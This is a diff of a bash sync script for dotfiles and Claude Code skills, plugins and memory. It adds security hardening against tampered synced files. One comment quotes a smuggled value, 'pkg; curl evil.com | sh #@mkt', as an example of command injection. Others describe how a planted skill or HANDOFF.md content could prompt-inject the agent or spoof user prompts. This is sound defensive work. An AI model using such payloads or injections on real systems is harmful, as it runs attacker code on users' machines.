+    # "foo.bar" 会写成 [modules."foo.bar"]）。tomllib 是 Python 3.11+ stdlib；
+    # 不可用时回退到原 regex 以兼容旧环境。
     local MANAGED_SKILLS=""
     if [ -f "$MANIFEST" ]; then
-        MANAGED_SKILLS=$(python -c "
-import sys, re
-with open(sys.argv[1], encoding='utf-8') as f:
-    text = f.read()
-for m in re.findall(r'\[modules\.([^\]]+)\]', text):
-    m = m.strip('\"')
-    if '.' not in m:
-        print(m)
+        MANAGED_SKILLS=$(python -I -c "
+import sys
+try:
+    import tomllib
+except ImportError:
+    tomllib = None
+path = sys.argv[1]
+if tomllib is not None:
+    with open(path, 'rb') as f:
+        data = tomllib.load(f)
+    mods = data.get('modules') or {}
+    for name in mods.keys():
+        print(name)
+else:
+    import re
+    with open(path, encoding='utf-8') as f:
+        text = f.read()
+    for m in re.findall(r'\[modules\.([^\]]+)\]', text):
+        m = m.strip('\"')
+        # Pre-3.11 regex fallback: skip obvious sub-tables (foo.source);
+        # imperfect against legitimate dotted module names but better than
+        # nothing for older Python installs.
+        if '.' not in m:
+            print(m)
 " "$MANIFEST_PY" 2>/dev/null || true)
     fi
 
@@ -1181,21 +2172,37 @@ for m in re.findall(r'\[modules\.([^\]]+)\]', text):
             [ ! -d "$d" ] && continue
             local name
             name=$(basename "$d")
-            if ! echo "$MANAGED_SKILLS" | grep -Fqx "$name"; then
+            # Skip backup-pattern names left over from cmd_update interrupts
+            # (module-manager.sh swaps `$dest` to `${dest}.bak` before the new
+            # content arrives; Ctrl+C between mv and rollback strands the .bak
+            # directory under SKILLS_DIR). Without this filter, the next /sync
+            # would mis-classify `<name>.bak/` as a custom skill and mirror it
+            # into the dotfiles repo + every other device.
+            case "$name" in
+                *.bak|*.bak.*) continue ;;
+            esac
+            if ! echo "$MANAGED_SKILLS" | grep -Fqx -- "$name"; then
                 CUSTOM_NAMES+=("$name")
             fi
         done
     fi
 
     # dotfiles 侧：同样拒绝 symlink 目录（更高威胁——dotfiles 可能从 remote pull
-    # 进来带 symlink 的攻击 payload）
+    # 进来带 symlink 的攻击 payload）。.bak 过滤与 LOCAL_SKILLS 并行——一个被劫
+    # 持的 dotfiles 推送如果落下 `foo.bak/`，本机不应该把它当作新的自制 skill
+    # 来导入。.bak/.bak.<epoch> 过滤共四处，须保持同步：sync_commit_push 的
+    # git add pathspec、第 6 步 dotfiles status 的 python 过滤、上面的
+    # LOCAL_SKILLS 循环，以及这里。
     if [ -d "$DOTFILES_SKILLS" ]; then
         for d in "$DOTFILES_SKILLS"/*/; do
             [ -L "${d%/}" ] && continue
             [ ! -d "$d" ] && continue
             local name
             name=$(basename "$d")
-            if ! echo "$MANAGED_SKILLS" | grep -Fqx "$name"; then
+            case "$name" in
+                *.bak|*.bak.*) continue ;;
+            esac
+            if ! echo "$MANAGED_SKILLS" | grep -Fqx -- "$name"; then
                 CUSTOM_NAMES+=("$name")
             fi
         done
@@ -1217,6 +2224,15 @@ for m in re.findall(r'\[modules\.([^\]]+)\]', text):
 
     mkdir -p "$DOTFILES_SKILLS"
 
+    # Read per-machine import-rejection list (gitignored). Names recorded here
+    # never trigger SKILL_IMPORT prompts again — `sync.sh skill-import
+    # --action=reject` appends to it. Same parser as .sync_ignore so a
+    # tampered file with control chars / comment lines / CRLF behaves
+    # consistently on both sides.
+    local SKILL_IGNORE_FILE="$SKILL_IGNORE_FILE"
+    local SKILL_IGNORE_LIST
+    SKILL_IGNORE_LIST=$(_read_ignore_file "$SKILL_IGNORE_FILE")
+
     # Step C: 对每个自制 skill，双向逐文件同步
     while IFS= read -r skill_name; do
         [ -z "$skill_name" ] && continue
@@ -1224,6 +2240,75 @@ for m in re.findall(r'\[modules\.([^\]]+)\]', text):
         local local_skill="${LOCAL_SKILLS}/${skill_name}"
 
         echo "  ${skill_name}/:"
+
+        # SKILL_IMPORT gate: dotfiles side has a new top-level skill directory
+        # that the local machine has never seen. A compromised dotfiles push
+        # could drop an arbitrary skill (whose SKILL.md frontmatter steers
+        # Claude into prompt-injected behavior the moment any related trigger
+        # phrase fires) onto every device on the next /sync. The previous code
+        # would mirror via Case 4 of sync_config_file with no prompt. Gate
+        # behind explicit user approval — same pattern as IMPORT for sensitive
+        # single files, but per-directory.
+        if [ -d "$dotfiles_skill" ] && [ ! -d "$local_skill" ]; then
+            if [ -n "$SKILL_IGNORE_LIST" ] && echo "$SKILL_IGNORE_LIST" | grep -Fqx -- "$skill_name"; then
+                echo "    (在 .skill_import_ignore 中，跳过)"
+                CFG_SKIPPED=$((CFG_SKIPPED+1))
+                continue
+            fi
+            local _file_count
+            _file_count=$(cd "$dotfiles_skill" && find -P . -type f \
+                ! -path '*/__pycache__/*' ! -name '*.pyc' 2>/dev/null | wc -l | tr -d ' ')
+            local _has_skill_md=no
+            [ -f "${dotfiles_skill}/SKILL.md" ] && _has_skill_md=yes
+            if [ "$INTERACTIVE" = true ]; then
+                echo -e "    ${YELLOW}!${NC} 新 skill (dotfiles 有，本地无)：${_file_count} 个文件，SKILL.md=${_has_skill_md}"
+                echo "    被篡改的 dotfiles 推送可借此把恶意 skill 落到所有设备，请确认。"
+                read -r -p "    导入到 ${local_skill}？(y/N): " _SK_IMP
+                case "$_SK_IMP" in
+                    y|Y)
+                        # Refuse if dotfiles_skill contains nested symlinks
+                        # — see skill-import accept site for full rationale
+                        # (TOCTOU between cp and find -delete).
+                        if _has_symlinks "$dotfiles_skill"; then
+                            echo -e "    ${RED}✗${NC} ${skill_name}: 源含嵌套符号链接，拒绝导入" >&2
+                            echo "    清理 ${dotfiles_skill} 下的符号链接后下次 /sync 再决定。" >&2
+                            CFG_FAIL=$((CFG_FAIL+1))
+                            HAS_ERROR=1
+                            continue
+                        fi
+                        if cp -a -- "$dotfiles_skill" "$local_skill"; then
+                            find "$local_skill" -type l -delete 2>/dev/null || true
+                            echo -e "    ${GREEN}←${NC} ${skill_name}: 已导入"
+                            CFG_SYNCED=$((CFG_SYNCED+1))
+                            # Fall through to file-level sync now that local
+                            # exists — next pass will see no diffs.
+                        else
+                            echo -e "    ${RED}✗${NC} ${skill_name}: cp 失败"
+                            CFG_FAIL=$((CFG_FAIL+1))
+                            HAS_ERROR=1
+                            continue
+                        fi
+                        ;;
+                    *)
+                        echo "    已跳过；下次 /sync 会再次询问。"
+                        CFG_CONFLICT=$((CFG_CONFLICT+1))
+                        continue
+                        ;;
+                esac
+            else
+                # 非交互：emit SKILL_IMPORT 块，由 SKILL.md 调 AskUserQuestion 决策
+                echo "===SKILL_IMPORT_BEGIN==="
+                echo "SKILL_NAME: $(_json_escape "$skill_name")"
+                echo "DOTFILES_PATH: $(_json_escape "$dotfiles_skill")"
+                echo "LOCAL_PATH: $(_json_escape "$local_skill")"
+                echo "FILE_COUNT: ${_file_count}"
+                echo "HAS_SKILL_MD: ${_has_skill_md}"
+                echo "REASON: new custom skill directory in dotfiles (would auto-load via SKILL.md frontmatter — confirm before mirror)"
+                echo "===SKILL_IMPORT_END==="
+                CFG_CONFLICT=$((CFG_CONFLICT+1))
+                continue
+            fi
+        fi
 
         # 合并两侧文件列表（排除 __pycache__、.pyc）
         # find -P：不跟随 symlink。即使顶层 skill 目录已经通过 [-L] 拒绝过，
@@ -1279,7 +2364,7 @@ except Exception as e:
 enabled = settings.get('enabledPlugins') or {}
 marketplaces = settings.get('extraKnownMarketplaces') or {}
 # 类型守卫：CC settings schema 演化后这两键若变成 list/string，下面 .items() / .get() 会崩
-# 既然类型不对就当成"什么都没启用"处理，让 plugin 检测安静返回而不是给个 AttributeError
+# 既然类型不对就当成「什么都没启用」处理，让 plugin 检测安静返回而不是给个 AttributeError
 if not isinstance(enabled, dict):
     enabled = {}
 if not isinstance(marketplaces, dict):
@@ -1303,7 +2388,7 @@ for plugin_id, is_enabled in enabled.items():
     if len(parts) != 2:
         continue
     name, mkt = parts
-    # 用 `or {}`：JSON 显式 null 时 .get(k, default) 仍返回 None，后续 .get 会抛
+    # 用 \`or {}\`：JSON 显式 null 时 .get(k, default) 仍返回 None，后续 .get 会抛
     # AttributeError 中断 missing 收集，导致 plugin 检测结果截断（假阴性）
     mkt_info = marketplaces.get(mkt) or {}
     source = mkt_info.get('source') or {}
@@ -1316,31 +2401,86 @@ for m in missing:
 
     [ -z "$MISSING" ] && return 0
 
+    # Charset validation: settings.json comes from the synced dotfiles repo and
+    # can be tampered (compromised collaborator, dotfiles GitHub auth leak). If
+    # we interpolate plugin_id / marketplace name / repo URL into the suggested
+    # install command without validation, a malicious value like
+    # `pkg; curl evil.com | sh #@mkt` would render as an install command that
+    # executes attacker code the moment the user copies it. Validate against
+    # tight regexes before emit; reject (with a visible warning) if any value
+    # has a shell metacharacter.
+    # First char anchored to alphanumeric/underscore so a tampered
+    # settings.json declaring enabledPlugins["-h@mkt"] = true (or `.x@y`)
+    # can't render an install command whose first token starts with `-`
+    # or `.`, which `claude plugin install` could parse as a flag bundle
+    # or hidden-file path. Same hardening as module-manager.sh's
+    # _validate_module_name.
+    local PLUGIN_ID_RE='^[A-Za-z0-9_][A-Za-z0-9._-]*@[A-Za-z0-9_][A-Za-z0-9._-]*$'
+    local MKT_NAME_RE='^[A-Za-z0-9_][A-Za-z0-9._-]*$'
+    # Repo URL: accept GitHub owner/repo shorthand OR https URL with safe chars.
+    # Both branches anchored at the first significant char to block leading `-`/`.`.
+    local REPO_URL_RE='^(https://[A-Za-z0-9][A-Za-z0-9._/-]*|[A-Za-z0-9_][A-Za-z0-9._-]*/[A-Za-z0-9_][A-Za-z0-9._-]*)$'
+
     echo ""
     echo -e "${YELLOW}检测到未安装的插件：${NC}"
     local INSTALL_CMDS=""
     while IFS='|' read -r plugin_id mkt_repo; do
         [ -z "$plugin_id" ] && continue
+        if ! [[ "$plugin_id" =~ $PLUGIN_ID_RE ]]; then
+            echo -e "  ${RED}✗${NC} 插件 ID 格式异常，跳过命令生成（可能来自被篡改的 settings.json）"
+            continue
+        fi
         local mkt="${plugin_id#*@}"
+        if ! [[ "$mkt" =~ $MKT_NAME_RE ]]; then
+            echo -e "  ${RED}✗${NC} ${plugin_id}: marketplace 名格式异常，跳过"
+            continue
+        fi
+        if [ -n "$mkt_repo" ] && ! [[ "$mkt_repo" =~ $REPO_URL_RE ]]; then
+            echo -e "  ${RED}✗${NC} ${plugin_id}: marketplace 仓库 URL 格式异常，跳过"
+            continue
+        fi
         if [ -n "$mkt_repo" ]; then
             echo -e "  ${YELLOW}!${NC} ${plugin_id}  (marketplace: ${mkt_repo})"
         else
             echo -e "  ${YELLOW}!${NC} ${plugin_id}"
         fi
-        # 收集安装命令
+        # 收集安装命令（已通过严格 charset 校验，不需再 escape）
         if [ ! -d "${HOME}/.claude/plugins/marketplaces/${mkt}" ] && [ -n "$mkt_repo" ]; then
             INSTALL_CMDS+="  claude plugin add-marketplace ${mkt} --url ${mkt_repo}"$'\n'
         fi
         INSTALL_CMDS+="  claude plugin install ${plugin_id}"$'\n'
     done <<< "$MISSING"
-    echo -e "${YELLOW}运行以下命令安装：${NC}"
-    printf '%s' "$INSTALL_CMDS"
+    if [ -n "$INSTALL_CMDS" ]; then
+        echo -e "${YELLOW}运行以下命令安装：${NC}"
+        printf '%s' "$INSTALL_CMDS"
+    fi
     echo ""
 }
 
 # --- 第 2 步：先拉取 dotfiles 并同步全局配置（智能双向） ---
 echo ""
 echo "[2/6] 同步全局配置..."
+
+# 安全检查：dotfiles 仓库必须是 private。本步会把 ~/.claude/projects/*/memory/、
+# settings.json、CLAUDE.md、skills、hooks 全部同步到 dotfiles，这些内容可能含
+# API token、本地路径、项目上下文、对话记忆。如果用户不小心把 dotfiles 仓库改
+# 成 public（GitHub UI 上一键操作），下一次 sync 就会把这些内容公开推送到
+# GitHub。运行时查询一次 visibility 并在 public 时中止，比事后追回便宜得多。
+# gh API 不可达时降级为继续（避免离线/限流场景下的死锁），但发警告。
+if [ "${SYNC_TEST_MODE:-}" != "1" ] && [ "${KNOWN_REPOS[$DOTFILES_REPO]+_}" ] && [ -n "${GH:-}" ]; then
+    _DOTFILES_VIS=$("$GH" repo view "${GITHUB_USER}/${DOTFILES_REPO}" --json visibility -q '.visibility' 2>/dev/null || echo "")
+    if [ "$_DOTFILES_VIS" = "PUBLIC" ]; then
+        echo -e "${RED}错误：dotfiles 仓库 ${GITHUB_USER}/${DOTFILES_REPO} 当前为 PUBLIC。${NC}" >&2
+        echo -e "${RED}sync 会把 settings.json / 项目 memory / skills 推送过去，PUBLIC 状态意味着公开发布。${NC}" >&2
+        echo -e "${RED}请先在 GitHub 上把仓库改回 Private，再重新运行 sync.sh。${NC}" >&2
+        echo -e "${YELLOW}（如果你确实希望 dotfiles 公开同步，请先清理仓库内容并明确确认，再手动绕过此检查。）${NC}" >&2
+        exit 1
+    elif [ -z "$_DOTFILES_VIS" ]; then
+        echo -e "${YELLOW}警告：无法查询 dotfiles 仓库可见性（gh API 不可达或权限不足）。${NC}" >&2
+        echo -e "${YELLOW}请自行确认 ${GITHUB_USER}/${DOTFILES_REPO} 仍为 Private。${NC}" >&2
+    fi
+    unset _DOTFILES_VIS
+fi
 
 if [ "${KNOWN_REPOS[$DOTFILES_REPO]+_}" ]; then
     DOTFILES_URL="${REPO_URLS[$DOTFILES_REPO]}"
@@ -1356,8 +2496,23 @@ if [ "${KNOWN_REPOS[$DOTFILES_REPO]+_}" ]; then
 
     if [ -d "$DOTFILES_DIR" ] && pushd "$DOTFILES_DIR" >/dev/null; then
         echo "拉取 dotfiles 远程更新..."
-        DOTFILES_PULL_OUTPUT=$(git pull --rebase 2>&1)
-        DOTFILES_PULL_EXIT=$?
+        # Explicit `origin <branch>` instead of bare pull — combined with
+        # the upstream-presence check, a misconfigured tracking branch surfaces
+        # as a real failure here instead of silently no-op'ing and letting
+        # step 2 run against stale local content.
+        # Split stdout / stderr so $DOTFILES_PULL_BRANCH holds a branch name
+        # on success only — never an error message that previously rode the
+        # same variable on the error path.
+        _PULL_BRANCH_ERR="${SYNC_TMPDIR}/_pull_branch_err.dotfiles"
+        DOTFILES_PULL_BRANCH=$(_resolve_pull_branch 2>"$_PULL_BRANCH_ERR")
+        if [ $? -ne 0 ]; then
+            DOTFILES_PULL_OUTPUT=$(cat "$_PULL_BRANCH_ERR" 2>/dev/null)
+            DOTFILES_PULL_EXIT=1
+        else
+            DOTFILES_PULL_OUTPUT=$(git pull --rebase origin "refs/heads/$DOTFILES_PULL_BRANCH" 2>&1)
+            DOTFILES_PULL_EXIT=$?
+        fi
+        rm -f "$_PULL_BRANCH_ERR" 2>/dev/null
         echo "$DOTFILES_PULL_OUTPUT"
 
         if [ $DOTFILES_PULL_EXIT -ne 0 ]; then
@@ -1415,12 +2570,28 @@ if [ "${KNOWN_REPOS[$DOTFILES_REPO]+_}" ]; then
             echo "同步 Memory 文件..."
             CFG_SYNCED=0; CFG_SKIPPED=0; CFG_CONFLICT=0; CFG_FAIL=0
             MEM_SYNCED=0
+            # compute_cc_hash collapses `:/_` into `-`; two distinct repo
+            # paths that hash-collide would cause sync_memory_dir to write
+            # one project's memory files under another's CC_PROJECT_DIR.
+            # Detect duplicate hashes across repos in this run and surface
+            # a warning so the user can investigate before any cross-
+            # contamination ships.
+            declare -A _SEEN_CC_HASH=()
             for name in "${!KNOWN_REPOS[@]}"; do
                 MEM_REPO_DIR=$(_find_repo_dir "$name") || continue
+                _cc_hash=$(compute_cc_hash "$MEM_REPO_DIR" 2>/dev/null || echo "")
+                if [ -n "$_cc_hash" ]; then
+                    if [ -n "${_SEEN_CC_HASH[$_cc_hash]:-}" ] && [ "${_SEEN_CC_HASH[$_cc_hash]}" != "$name" ]; then
+                        echo -e "  ${YELLOW}警告${NC}: 仓库 '$name' 与 '${_SEEN_CC_HASH[$_cc_hash]}' 计算出相同的 CC_HASH ($_cc_hash)" >&2
+                        echo -e "  ${YELLOW}      memory 文件可能交叉污染；请重命名其中一个仓库后重试${NC}" >&2
+                    fi
+                    _SEEN_CC_HASH["$_cc_hash"]="$name"
+                fi
                 if sync_memory_dir "$MEM_REPO_DIR" "$name"; then
                     MEM_SYNCED=$((MEM_SYNCED + 1))
                 fi
             done
+            unset _SEEN_CC_HASH
             if [ $MEM_SYNCED -eq 0 ]; then
                 echo "  (无项目有 memory 需要同步)"
             else
@@ -1477,7 +2648,7 @@ _interactive_clone_menu() {
     echo "  [s] 跳过（下次仍会询问）"
     echo "  [i] 忽略（以后不再询问）"
     echo ""
-    read -p "> " choice < /dev/tty
+    read -r -p "> " choice < /dev/tty
     choice=$(echo "$choice" | tr -d '\r\n')
 
     # Handle numeric choice
@@ -1503,14 +2674,14 @@ _interactive_clone_menu() {
     case "$choice" in
         n|N)
             echo ""
-            read -p "$(printf '请输入完整路径（例如 D:/MyProjects 或 C:/Users/你的用户名/Documents/Code）：\n> ')" new_path < /dev/tty
+            read -r -p "$(printf '请输入完整路径（例如 D:/MyProjects 或 C:/Users/你的用户名/Documents/Code）：\n> ')" new_path < /dev/tty
             new_path=$(echo "$new_path" | tr -d '\r\n')
             if [ -z "$new_path" ]; then
                 echo "路径为空，跳过"
                 return 1
             fi
             if [ ! -d "$new_path" ]; then
-                read -p "路径 $new_path 不存在，是否创建？(y/n) " create_confirm < /dev/tty
+                read -r -p "路径 $new_path 不存在，是否创建？(y/n) " create_confirm < /dev/tty
                 if [[ "$create_confirm" =~ ^[Yy] ]]; then
                     mkdir -p "$new_path" || { echo -e "${RED}创建失败${NC}"; return 1; }
                 else
@@ -1542,6 +2713,13 @@ _interactive_clone_menu() {
             ;;
         i|I)
             local ignore_file="${SCRIPT_DIR}/.sync_ignore"
+            # Validate on write to match the read-side filter (_read_ignore_file):
+            # a name that wouldn't survive read-back shouldn't be written.
+            # Leading dot allowed (mirrors read side, e.g. .github); bare . / .. rejected.
+            if [[ ! "$repo_name" =~ ^[A-Za-z0-9_.][A-Za-z0-9_.-]*$ ]] || [[ "$repo_name" =~ ^\.+$ ]]; then
+                echo "仓库名 '${repo_name}' 含非法字符，未写入 .sync_ignore" >&2
+                return 1
+            fi
             # Ensure trailing newline before appending (handles manually edited files)
             if [ -f "$ignore_file" ] && [ -n "$(tail -c 1 "$ignore_file" 2>/dev/null)" ]; then
                 echo "" >> "$ignore_file"
@@ -1572,7 +2750,7 @@ _append_workspace_root() {
         return 1
     fi
     trap 'rmdir "'"$_lockdir"'" 2>/dev/null' RETURN
-    python -c "
+    python -I -c "
 import os, shlex, sys, tempfile
 env_path = sys.argv[1]
 new_root = sys.argv[2]
@@ -1626,6 +2804,48 @@ except Exception:
     fi
 }
 
+# 归一化 git remote URL 到 host/owner/repo 形式，使 SSH 与 HTTPS 两种写法可直接比较。
+# 背景：GitHub API 返回 https://host/owner/repo，本地 remote 迁移到 SSH 后是
+# git@host:owner/repo.git —— 直接字符串比较会把同一仓库误判为"URL 不匹配"。
+# 支持的输入形式：
+#   https://host/owner/repo(.git)
+#   ssh://[user@]host[:port]/owner/repo(.git)
+#   [user@]host:owner/repo(.git)        (scp-like SSH 写法)
+# 无法识别的形式原样返回，保持旧的精确比较语义。
+_normalize_git_url() {
+    local url="$1"
+    # 先循环剥掉所有尾部斜杠，再去 .git —— 顺序很重要：若先去 .git，repo.git/
+    # 因尾部还有斜杠匹配不到 .git，只剥一个斜杠后剩 repo.git，与 API 的
+    # owner/repo 误判不等。repo// 同理需循环剥净。
+    while [ "${url%/}" != "$url" ]; do url="${url%/}"; done
+    url="${url%.git}"
+    local host path port=""
+    # scp-like：[user@]host:owner/repo —— 冒号后首字符非 /，借此与 scheme:// 区分
+    if [[ "$url" =~ ^([^/@]+@)?([^/:]+):([^/].*)$ ]]; then
+        host="${BASH_REMATCH[2]}"; path="${BASH_REMATCH[3]}"
+    # scheme://[user@]host[:port]/owner/repo —— 只认 https / ssh：http/git/file 等
+    # 与 https 并不等价（明文/未认证传输降级、file:// 是本地路径），放行会让
+    # remote URL 安全校验把非等价 origin 误判为匹配。其它 scheme 落到 else 走
+    # 精确比较。端口纳入归一化，使 ssh://...:2222/ 这类非默认端口不再与无端口
+    # 形式误判相等。
+    elif [[ "$url" =~ ^(https|ssh)://([^@/]+@)?([^/:]+)(:[0-9]+)?/(.+)$ ]]; then
+        local scheme="${BASH_REMATCH[1]}"
+        host="${BASH_REMATCH[3]}"; port="${BASH_REMATCH[4]}"; path="${BASH_REMATCH[5]}"
+        # 默认端口（https→443 / ssh→22）等价于无端口：剥掉，避免与 API 返回的无端口
+        # URL 误判不等而走进"URL 不匹配"分支（该分支会回显含凭据的原始 origin）。
+        # 非默认端口（如 :2222）保留以区分。
+        if { [ "$scheme" = "https" ] && [ "$port" = ":443" ]; } \
+           || { [ "$scheme" = "ssh" ] && [ "$port" = ":22" ]; }; then
+            port=""
+        fi
+    else
+        printf '%s' "$url"   # 无法识别的形式原样返回，保持旧的精确比较语义
+        return
+    fi
+    # 主机名大小写无关，折叠为小写再比较；owner/repo 在磁盘上大小写敏感，保持原样
+    printf '%s%s/%s' "${host,,}" "$port" "$path"
+}
+
 # 单个仓库的处理函数（在子进程中运行）
 # 输出写入 SYNC_TMPDIR/<name>.out，结果写入 .result，错误标记 .error
 _process_repo() {
@@ -1646,10 +2866,22 @@ _process_repo() {
 
     # Pull
     # LC_ALL=C 强制英文输出，后续对 "Already up to date" 的字符串匹配才稳定
+    # 显式 `origin <branch>` + 预检 upstream，避免 tracking 缺失场景下
+    # bare pull 静默成功但实际什么都没拉的情况
     echo "拉取远程更新..."
-    local PULL_OUTPUT PULL_EXIT
-    PULL_OUTPUT=$(LC_ALL=C git pull --rebase 2>&1)
-    PULL_EXIT=$?
+    # Split stdout / stderr so $PULL_BRANCH holds a branch name on success
+    # only — never an error message that previously rode the same variable.
+    local PULL_OUTPUT PULL_EXIT PULL_BRANCH _PULL_BRANCH_ERR
+    _PULL_BRANCH_ERR="${SYNC_TMPDIR}/_pull_branch_err.${REPO_NAME}"
+    PULL_BRANCH=$(_resolve_pull_branch 2>"$_PULL_BRANCH_ERR")
+    if [ $? -ne 0 ]; then
+        PULL_OUTPUT=$(cat "$_PULL_BRANCH_ERR" 2>/dev/null)
+        PULL_EXIT=1
+    else
+        PULL_OUTPUT=$(LC_ALL=C git pull --rebase origin "refs/heads/$PULL_BRANCH" 2>&1)
+        PULL_EXIT=$?
+    fi
+    rm -f "$_PULL_BRANCH_ERR" 2>/dev/null
     if [ $PULL_EXIT -ne 0 ]; then
         echo "${REPO_NAME}|pull 失败 - 需要 Claude 处理" > "${SYNC_TMPDIR}/${REPO_NAME}.result"
         echo -e "${RED}pull 失败：${PULL_OUTPUT}${NC}"
@@ -1749,12 +2981,16 @@ _process_repo() {
                 echo ""
                 return
             fi
+            # User-controlled fields pre-JSON-escaped. Filenames already passed
+            # the '===' / CR / LF / tab safety check above, but may still carry
+            # backslashes or double-quotes that would break SKILL.md's JSON
+            # interpolation if emitted raw.
             echo "===UNTRACKED_BEGIN==="
-            echo "REPO: $REPO_NAME"
-            echo "REPO_PATH: $(pwd)"
+            echo "REPO: $(_json_escape "$REPO_NAME")"
+            echo "REPO_PATH: $(_json_escape "$(pwd)")"
             echo "FILES:"
             for _f in "${UNTRACKED_LIST[@]}"; do
-                echo "        $_f"
+                echo "        $(_json_escape "$_f")"
             done
             echo "===UNTRACKED_END==="
             echo "${REPO_NAME}|未跟踪文件待决定" > "${SYNC_TMPDIR}/${REPO_NAME}.result"
@@ -1971,8 +3207,9 @@ while IFS='|' read -r REPO_NAME REPO_URL; do
     if FOUND_DIR=$(_find_repo_dir "$REPO_NAME"); then
         # 校验 remote URL 是否匹配（防止多路径下同名仓库误操作）
         _actual_url=$(git -C "$FOUND_DIR" remote get-url origin 2>/dev/null || true)
-        _expect_clean="${REPO_URL%.git}"
-        _actual_clean="${_actual_url%.git}"
+        # 归一化后比较：SSH 与 HTTPS 写法等价，避免迁移认证方式后误判不匹配
+        _expect_clean=$(_normalize_git_url "$REPO_URL")
+        _actual_clean=$(_normalize_git_url "$_actual_url")
         if [ -z "$_actual_url" ]; then
             # 本地仓库没有 origin —— 无法做 URL 校验也无法 push/pull 同名 repo
             echo "${REPO_NAME}|本地仓库无 origin remote，已跳过" > "${SYNC_TMPDIR}/${REPO_NAME}.result"
@@ -1987,7 +3224,9 @@ while IFS='|' read -r REPO_NAME REPO_URL; do
             { echo "----- ${REPO_NAME} -----"
               echo "警告：本地 ${FOUND_DIR} 的 origin URL 与 GitHub 不匹配"
               echo "  期望: ${REPO_URL}"
-              echo "  实际: ${_actual_url}"
+              # 抹掉 origin URL 里的 userinfo（scheme://user:token@host）再打印，
+              # 避免把内嵌的 PAT/凭据回显到终端与会话记录。
+              echo "  实际: $(printf '%s' "${_actual_url}" | sed -E 's#(://)[^/@]*@#\1<credentials-redacted>@#')"
               echo "已跳过，请手动检查"; } > "${SYNC_TMPDIR}/${REPO_NAME}.out"
             touch "${SYNC_TMPDIR}/${REPO_NAME}.error"
             continue
@@ -1997,7 +3236,15 @@ while IFS='|' read -r REPO_NAME REPO_URL; do
         # - 交互模式：串行前台处理（防止多个未跟踪文件 prompt 争抢 /dev/tty），
         #   输出直接到终端；不再写 .out 文件，Step 4 cat 循环因此在交互模式下不会重播
         if [ "$INTERACTIVE" = true ]; then
-            _process_repo "$REPO_NAME" "$REPO_URL" "$FOUND_DIR"
+            # Run in subshell — _process_repo internally `cd`s into REPO_DIR
+            # and does not restore PWD. In non-interactive mode the trailing `&`
+            # implicitly subshells the call; interactive mode does not, so a
+            # bare call would leak the final repo's cwd into the main script.
+            # Step 6's pushd "$DOTFILES_DIR" then resolves a relative path
+            # against the wrong directory — a malicious project repo with a
+            # matching subdir (e.g. a `dotfiles/` folder) would be the actual
+            # commit/push target. Subshell isolation closes this path.
+            ( _process_repo "$REPO_NAME" "$REPO_URL" "$FOUND_DIR" )
         else
             _process_repo "$REPO_NAME" "$REPO_URL" "$FOUND_DIR" > "${SYNC_TMPDIR}/${REPO_NAME}.out" 2>&1 &
         fi
@@ -2145,13 +3392,19 @@ else
 fi
 
 # --- Handoff banner 辅助函数 ---
+# HANDOFF.md is git-synced and untrusted per Step 3's trust model (compromised
+# dotfiles auth, stolen device, malicious collaborator). Without a column-0
+# prefix on every body line, a task containing literal `===PRUNE_BEGIN===` or
+# `NEW_REPO: …` would satisfy SKILL.md's exact-line-equality marker scan and
+# fabricate a fake user prompt for arbitrary file operations. `_prefix_lines`
+# inserts "> " at column 0 of each content line so the scan misses them.
 print_handoff_banner() {
     local title="$1" content="$2"
     echo ""
     echo -e "${YELLOW}=========================================${NC}"
     echo -e "${YELLOW} HANDOFF: ${title}${NC}"
     echo -e "${YELLOW}=========================================${NC}"
-    echo "$content"
+    _prefix_lines "$content"
     echo -e "${YELLOW}=========================================${NC}"
 }
 
@@ -2159,14 +3412,18 @@ print_handoff_banner() {
 echo ""
 echo "[5/6] Handoff 检测..."
 
-# Auto-migrate HANDOFF.md to registry format (idempotent)
-if [ -f "$HANDOFF_FILE" ]; then
-    python "$HANDOFF_PY" migrate "$HANDOFF_FILE_PY" >/dev/null 2>&1 || true
-fi
-
-if [ ! -f "$HANDOFF_FILE" ]; then
+if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+    echo "（test mode：跳过 handoff 检测）"
+elif [ ! -f "$HANDOFF_FILE" ]; then
     echo -e "${RED}警告：HANDOFF.md 不存在（pull 失败或文件损坏？）${NC}"
 else
+    # Auto-migrate HANDOFF.md to registry format (idempotent). stdout is
+    # currently empty for this command, so dropping the redirect costs
+    # nothing; stderr stays connected so migrate_format's validation
+    # warning (offending ## headers) reaches the user — closing the
+    # silent-no-op gap where a malformed device name kept the file in
+    # legacy mode indefinitely with no signal.
+    python "$HANDOFF_PY" migrate "$HANDOFF_FILE_PY" >/dev/null || true
     HANDOFF_READY=0
 
     if ! get_machine_name; then
@@ -2177,7 +3434,7 @@ else
             echo -e "${YELLOW}未找到 .machine-name，需要设置设备名称。${NC}"
 
             while true; do
-                read -p "请输入本设备的名称（如 Desktop、Laptop），留空跳过：" INPUT_NAME
+                read -r -p "请输入本设备的名称（如 Desktop、Laptop），留空跳过：" INPUT_NAME
                 INPUT_NAME=$(echo "$INPUT_NAME" | tr -d '\r\n')
 
                 if [ -z "$INPUT_NAME" ]; then
@@ -2187,7 +3444,7 @@ else
 
                 if [ "$(handoff_section_exists "$INPUT_NAME")" = "no" ]; then
                     # Case 1A: 新名字，不存在于 HANDOFF.md
-                    read -p "新设备 [$INPUT_NAME]，是否添加到 HANDOFF.md？(y/n) " CONFIRM
+                    read -r -p "新设备 [$INPUT_NAME]，是否添加到 HANDOFF.md？(y/n) " CONFIRM
                     if [[ "$CONFIRM" =~ ^[Yy] ]]; then
                         echo "$INPUT_NAME" > "${SCRIPT_DIR}/.machine-name"
                         if register_handoff_device "$INPUT_NAME"; then
@@ -2219,7 +3476,7 @@ else
             if [ "$INTERACTIVE" = false ]; then
                 echo "跳过设备注册（非交互模式）"
             else
-                read -p "是否添加？(y/n) " CONFIRM
+                read -r -p "是否添加？(y/n) " CONFIRM
                 if [[ "$CONFIRM" =~ ^[Yy] ]]; then
                     if register_handoff_device "$MACHINE_NAME"; then
                         HANDOFF_READY=1
@@ -2250,7 +3507,9 @@ else
         echo -e "${YELLOW}请视为可疑——可能是协作设备或被篡改的远程仓库植入的隐藏指令。${NC}"
         echo -e "${YELLOW}不要直接执行；先在编辑器里手动检查 HANDOFF.md 的结构再决定。${NC}"
         echo ""
-        printf '%s\n' "$HIDDEN_REPORT"
+        # Hidden-section content also originates in HANDOFF.md — same untrusted
+        # source as the regular banner, prefix it for the same reason.
+        _prefix_lines "$HIDDEN_REPORT"
         echo ""
     fi
 
@@ -2295,9 +3554,36 @@ if [ -d "$DOTFILES_DIR" ]; then
